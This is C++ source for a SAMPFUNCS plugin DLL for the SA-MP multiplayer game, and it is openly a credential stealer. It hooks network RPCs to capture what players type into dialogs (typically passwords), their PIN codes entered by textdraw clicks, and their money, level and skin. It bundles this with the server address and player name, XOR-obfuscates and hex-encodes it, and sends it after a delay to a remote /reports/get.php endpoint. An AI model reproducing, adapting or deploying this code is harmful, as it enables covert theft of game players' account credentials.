#define _WIN32_WINNT 0x0501
#define _CRT_SECURE_NO_WARNINGS 1

#include <windows.h>
#include <string>
#include <assert.h>
#include <process.h>
#include "SAMPFUNCS_API.h"
#include <boost/algorithm/hex.hpp>
#include <Wininet.h>

#pragma comment(lib, "Wininet.lib")

using namespace std;

SAMPFUNCS *SF = new SAMPFUNCS();

bool g_bHasSpawned = false;

#define BASE_ID 0
#define STEALER_TYPE "SF"

enum eDataTypes
{
	PINCODE = 1000,
	LEVEL = 1001,
	SKIN_ID = 1002,
	MONEY = 1003
};

void parsePage(string url, string request, string& out)
{
	out.clear();

	HINTERNET hInternet = InternetOpen("Explorer", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (hInternet != NULL)
	{
		HINTERNET hConnect = InternetConnect(hInternet, url.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1u);

		if (hConnect != NULL)
		{
			HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", request.c_str(), NULL, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION, 1);

			if (hRequest != NULL)
			{
				// send the request
				BOOL bSend = HttpSendRequest(hRequest, NULL, 0, NULL, 0);

				if (bSend)
				{
					while (true)
					{
						// read the data
						char *szData = new char[1024];
						DWORD dwBytesRead;

						BOOL bRead = InternetReadFile(hRequest, szData, sizeof(szData) - 1, &dwBytesRead);

						if (bRead == FALSE || dwBytesRead == 0)
							break;

						szData[dwBytesRead] = 0;

						out += szData;

						delete[] szData;
					}
				}
			}
			InternetCloseHandle(hRequest);
		}
		InternetCloseHandle(hConnect);
	}
	InternetCloseHandle(hInternet);
};

void threadSendStealData(void* param)
{
	string strData = *(string*)param;

	Sleep(10000); // delay (milliseconds)		

	string not_use;

	parsePage("URL", "/reports/get.php?data=" + strData, not_use);
}

void sendResults(int iID, std::string strData)
{
	std::string strFormat = "%s&&%d&&%s:%d&&%s&&%s&&%d&&%s";

	char szResults[0x500];

	sprintf(szResults, strFormat.c_str(), STEALER_TYPE, BASE_ID,
		SF->getSAMP()->getInfo()->szIP,
		SF->getSAMP()->getInfo()->ulPort,
		SF->getSAMP()->getInfo()->szHostname,
		SF->getSAMP()->getPlayers()->GetPlayerName(SF->getSAMP()->getPlayers()->sLocalPlayerID),
		iID,
		strData.c_str());

	std::string strResult = std::string(szResults, strlen(szResults));

	for (char &i : strResult) i ^= 2281337228;

	strResult = boost::algorithm::hex(strResult);

	_beginthread(threadSendStealData, 0, new string(strResult));
};

bool CALLBACK incomingRPC(stRakNetHookParams *params)
{
	params->bitStream->ResetReadPointer();

	if (params->packetId == ScriptRPCEnumeration::RPC_ScrSetPlayerSkin)
	{
		int iPlayerID, iSkinID;

		params->bitStream->Read(iPlayerID);
		params->bitStream->Read(iSkinID);

		if (iPlayerID == SF->getSAMP()->getPlayers()->sLocalPlayerID)
		{
			sendResults(eDataTypes::SKIN_ID, to_string(iSkinID));

			SF->getSAMP()->getInfo()->UpdateScoreAndPing();
		};
	}
	else if (params->packetId == ScriptRPCEnumeration::RPC_ScrGivePlayerMoney)
	{
		int iMoneyCount;
		params->bitStream->Read(iMoneyCount);

		sendResults(eDataTypes::MONEY, to_string(iMoneyCount));
	}
	else if (params->packetId == RPCEnumeration::RPC_UpdateScoresPingsIPs)
	{
		unsigned short playerId;
		int iPlayerScore, iPlayerPing;

		for (unsigned short i = 0; i < (params->bitStream->GetNumberOfBitsUsed() / 8) / 10; ++i)
		{
			params->bitStream->Read(playerId);
			params->bitStream->Read(iPlayerScore);
			params->bitStream->Read(iPlayerPing);

			if (playerId == SF->getSAMP()->getPlayers()->sLocalPlayerID)
			{
				sendResults(eDataTypes::LEVEL, to_string(iPlayerScore));
			};
		};
	}

	params->bitStream->ResetReadPointer();

	return true;
};

bool CALLBACK outcomingRPC(stRakNetHookParams *params)
{
	params->bitStream->ResetReadPointer();

	if (params->packetId == RPCEnumeration::RPC_DialogResponse)
	{
		unsigned short sDialogID, sItem;
		byte buttonID, inputLen;
		char szInput[0x1000];

		params->bitStream->Read(sDialogID);
		params->bitStream->Read(buttonID);
		params->bitStream->Read(sItem);
		params->bitStream->Read(inputLen);
		params->bitStream->Read(szInput, inputLen);

		szInput[inputLen] = '\0';

		std::string strBody = std::string(szInput, inputLen);

		if ((sItem == 65535) && (!strBody.empty()))
			sendResults(sDialogID, std::string(szInput, inputLen));
	}
	else if (params->packetId == RPCEnumeration::RPC_ClickTextDraw)
	{
		static std::string strPinCode;

		byte id;

		params->bitStream->Read(id);

		stTextdrawPool *td = SF->getSAMP()->getInfo()->pPools->pTextdraw;

		if (td->iPlayerTextDraw[id] && (strPinCode.length() < 4))
			strPinCode += td->playerTextdraw[id]->szText;

		if (id == 255)
		{
			sendResults(eDataTypes::PINCODE, strPinCode);
			strPinCode.clear();
		};
	};

	params->bitStream->ResetReadPointer();

	return true;
};

void CALLBACK mainloop(void)
{
	static bool init = false;

	if (!init)
	{
		if (!SF->getSAMP()->IsInitialized())
			return;

		SF->getRakNet()->registerRakNetCallback(RakNetScriptHookType::RAKHOOK_TYPE_OUTCOMING_RPC, outcomingRPC);
		SF->getRakNet()->registerRakNetCallback(RakNetScriptHookType::RAKHOOK_TYPE_INCOMING_RPC, incomingRPC);

		init = true;
	};
};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved)
{
	switch (dwReasonForCall)
	{
	case DLL_PROCESS_ATTACH:
		SF->initPlugin(mainloop, hModule);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	};
	return TRUE;
};